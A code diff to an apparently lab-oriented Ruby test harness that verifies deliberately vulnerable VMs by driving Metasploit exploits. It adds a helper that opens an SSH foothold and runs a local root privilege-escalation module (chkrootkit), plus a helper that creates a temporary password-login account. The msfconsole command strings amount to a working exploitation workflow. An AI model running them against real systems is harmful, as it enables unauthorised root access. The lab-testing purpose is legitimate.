@@ -505,20 +505,145 @@ class PostProvisionTest
     add_evidence('msf_output', "echo #{Shellwords.escape(msf_out[-4000..-1] || msf_out)}")
 
     body = sentinel_wait > 0 ? wait_for_sentinel(sentinel, sentinel_wait) : read_sentinel(sentinel)
-    if sentinel_pwned?(body)
-      if expect_privilege && !privilege_matches?(body, expect_privilege)
-        fail_check(name,
-                   "RCE confirmed, but the shell's privilege does not match the module's <privilege>=#{expect_privilege}: sentinel shows #{body[/uid=\S+/]}#{privilege_note(body)}. Expected #{expect_privilege.to_s =~ /user/ ? 'a non-root, non-sudoer shell' : 'a root or sudoer shell'}.",
-                   tier: tier)
-      else
-        pass_check(name,
-                   "RCE confirmed: #{msf_module} from #{attacker} (#{attacker_ip}) ran a command on the target (#{rhost}); sentinel #{sentinel} contains #{body[/uid=\S+/]}#{expect_privilege ? " — <privilege>=#{expect_privilege} verified#{privilege_note(body)}" : ''}.",
-                   tier: tier)
-      end
-    else
+    record_rce_outcome(name, body, sentinel,
+                       "RCE confirmed: #{msf_module} from #{attacker} (#{attacker_ip}) ran a command on the target (#{rhost})",
+                       expect_privilege, tier)
+  end
+
+  # --- Metasploit LOCAL exploit helper (tier 3) ---------------------------
+  # Drive a Metasploit *local* privilege-escalation exploit from the attacker VM.
+  # A local exploit (Msf::Exploit::Local) runs against an existing SESSION on the
+  # target, not an RHOSTS call — so there is nothing for test_msf_exploit to aim
+  # at. This helper first opens a low-privilege shell on the target with
+  # auxiliary/scanner/ssh/ssh_login (becomes session 1) using session_user /
+  # session_pass, then `use <msf_module>; set SESSION 1` and runs it.
+  #
+  # Proof is the same sentinel as the remote helper: the payload's CMD
+  # (cmd/unix/generic by default — runs on the target, no reverse/bind shell to
+  # race) writes `id` into a file the target's own guest agent reads back. For a
+  # deferred trigger (chkrootkit fires when root's cron next runs it, not when
+  # the exploit returns) pass sentinel_wait long enough for the next tick;
+  # expect_privilege: :root asserts the sentinel shows a root shell.
+  #
+  # The caller supplies the foothold credentials and is responsible for the
+  # account's lifecycle — see with_throwaway_ssh_user, which creates a disposable
+  # one on the target and removes it again, so the vulnerable image ships without
+  # an extra login.
+  #
+  #   with_throwaway_ssh_user do |user, pass|
+  #     test_msf_local_exploit('exploit/unix/local/chkrootkit',
+  #                            session_user: user, session_pass: pass,
+  #                            options: { 'CHKROOTKIT' => '/usr/sbin/chkrootkit',
+  #                                       'AllowNoCleanup' => true },
+  #                            expect_privilege: :root, sentinel_wait: 180)
+  #   end
+  def test_msf_local_exploit(msf_module, session_user:, session_pass:,
+                             ssh_port: 22, attacker: nil, rhost: nil,
+                             payload: 'cmd/unix/generic', collect: nil,
+                             force: false, options: {}, tier: 3, label: nil,
+                             expect_privilege: :root,
+                             sentinel_wait: (ENV['SECGEN_SENTINEL_WAIT'] || 180).to_i,
+                             sentinel_dir: '/tmp')
+    name = label || "msf local exploit (#{msf_module})"
+    resolved = resolve_attacker(name, attacker, rhost, tier)
+    return unless resolved
+    attacker, attacker_ip, rhost = resolved
+
+    # Capture sudo -n -l alongside id so privilege_matches? can tell a root shell
+    # (or a sudoer) from a plain user, exactly as test_msf_exploit does.
+    if expect_privilege
+      collect = [collect, 'echo secgen_sudo_begin; sudo -n -l 2>/dev/null; echo secgen_sudo_end'].compact.join('; ')
+    end
+    sentinel, cmd = build_sentinel(collect, dir: sentinel_dir)
+
+    login = { 'RHOSTS' => rhost, 'RPORT' => ssh_port, 'USERNAME' => session_user,
+              'PASSWORD' => session_pass, 'CreateSession' => true,
+              'BLANK_PASSWORDS' => false, 'ANONYMOUS_LOGIN' => false,
+              'STOP_ON_SUCCESS' => true }
+    exp = { 'SESSION' => 1, 'PAYLOAD' => payload, 'CMD' => cmd }
+    exp['ForceExploit'] = true if force
+    exp.merge!(options.map { |k, v| [k.to_s, v] }.to_h)
+
+    login_lines = login.map { |k, v| "set #{k} #{msf_set_value(v)};" }.join(' ')
+    exp_lines   = exp.map   { |k, v| "set #{k} #{msf_set_value(v)};" }.join(' ')
+
+    # HOME must be exported (see test_msf_exploit). One msfconsole run:
+    #   1. ssh_login opens the low-priv shell (session 1); `sessions -l` records
+    #      whether it actually opened, for the evidence on failure.
+    #   2. the local exploit plants its payload (here, chkrootkit's /tmp/update)
+    #      against that session. It is launched as a background job (exploit -j -z)
+    #      so msfconsole does NOT block on the module's own cron/handler wait — a
+    #      no-session cmd payload would make `run` hang until the guest-agent
+    #      timeout and return nothing. We sleep only long enough for the job to
+    #      write the payload, then exit; the deferred root-cron execution is
+    #      caught by our own wait_for_sentinel on the target.
+    plant_wait = (ENV['SECGEN_MSF_PLANT_WAIT'] || 30).to_i
+    msf = "export HOME=/root TERM=dumb; msfconsole -q -x " \
+          "\"use auxiliary/scanner/ssh/ssh_login; #{login_lines} run; sessions -l; " \
+          "use #{msf_module}; #{exp_lines} exploit -j -z; sleep #{plant_wait}; " \
+          "sessions -l; jobs; exit -y\""
+    result = run_on_system(attacker, msf, timeout: (ENV['SECGEN_MSF_TIMEOUT'] || 600).to_i)
+    msf_out = "#{result[:stdout]}\n#{result[:stderr]}"
+    add_evidence('msf_output', "echo #{Shellwords.escape(msf_out[-6000..-1] || msf_out)}")
+
+    body = sentinel_wait > 0 ? wait_for_sentinel(sentinel, sentinel_wait) : read_sentinel(sentinel)
+    record_rce_outcome(name, body, sentinel,
+                       "Privilege escalation confirmed: #{msf_module} via a #{session_user} SSH session from #{attacker} (#{attacker_ip}) ran a command on the target (#{rhost})",
+                       expect_privilege, tier)
+  end
+
+  # Shared PASS/FAIL recording once a sentinel has been read back for an exploit
+  # helper. PASS when it proves RCE (uid=) and, if expect_privilege is given, the
+  # shell's privilege matches the module's <privilege>; FAIL otherwise.
+  # success_prefix is the leading clause of the PASS detail (what ran, from where,
+  # against what); the sentinel/uid/privilege suffix is appended here.
+  def record_rce_outcome(name, body, sentinel, success_prefix, expect_privilege, tier)
+    unless sentinel_pwned?(body)
+      return fail_check(name,
+                        "Exploit did not confirm RCE: sentinel #{sentinel} absent or empty on the target. See msf_output evidence.",
+                        tier: tier)
+    end
+    if expect_privilege && !privilege_matches?(body, expect_privilege)
       fail_check(name,
-                 "Exploit did not confirm RCE: sentinel #{sentinel} absent or empty on the target. See msf_output evidence.",
+                 "RCE confirmed, but the shell's privilege does not match the module's <privilege>=#{expect_privilege}: sentinel shows #{body[/uid=\S+/]}#{privilege_note(body)}. Expected #{expect_privilege.to_s =~ /user/ ? 'a non-root, non-sudoer shell' : 'a root or sudoer shell'}.",
                  tier: tier)
+    else
+      pass_check(name,
+                 "#{success_prefix}; sentinel #{sentinel} contains #{body[/uid=\S+/]}#{expect_privilege ? " — <privilege>=#{expect_privilege} verified#{privilege_note(body)}" : ''}.",
+                 tier: tier)
+    end
+  end
+
+  # Create a throwaway unprivileged account on *this* system (the target) with a
+  # random password, make sure sshd accepts a password login for it, yield
+  # [user, pass] to the block, then delete the account and restore sshd on the
+  # way out (even if the block raises). Runs as root over the guest agent.
+  #
+  # For local-privesc modules whose Metasploit exploit needs a pre-existing
+  # low-privilege SESSION (e.g. exploit/unix/local/chkrootkit): the attacker's
+  # ssh_login lands on this account to open the foothold. The credential exists
+  # only for the duration of the block, so the vulnerable image has no extra
+  # login baked in. A sshd_config drop-in (first match wins) re-enables password
+  # auth regardless of a base's cloud-init default, and is removed afterwards.
+  def with_throwaway_ssh_user(user: nil, pass: nil)
+    user ||= "secgen_t3_#{rand(100_000)}"
+    pass ||= "T3pw_#{rand(10**12)}"
+    dropin = '/etc/ssh/sshd_config.d/00-secgen-test.conf'
+    creds = Shellwords.escape("#{user}:#{pass}")
+    setup = "set -e; id -u #{user} >/dev/null 2>&1 || useradd -m -s /bin/bash #{user}; " \
+            "echo #{creds} | chpasswd; mkdir -p /etc/ssh/sshd_config.d; " \
+            "printf 'PasswordAuthentication yes\\nKbdInteractiveAuthentication yes\\nUsePAM yes\\n' > #{dropin}; " \
+            "(systemctl reload ssh || systemctl reload sshd || systemctl restart ssh || systemctl restart sshd || true) 2>/dev/null; sleep 3"
+    run_vagrant_ssh(setup, timeout: 60)
+    yield user, pass
+  ensure
+    teardown = "pkill -u #{user} 2>/dev/null; userdel -r #{user} 2>/dev/null; " \
+               "rm -f #{dropin} /tmp/update; " \
+               "(systemctl reload ssh || systemctl reload sshd || true) 2>/dev/null"
+    begin
+      run_vagrant_ssh(teardown, timeout: 60)
+    rescue StandardError
+      nil
     end
   end
 
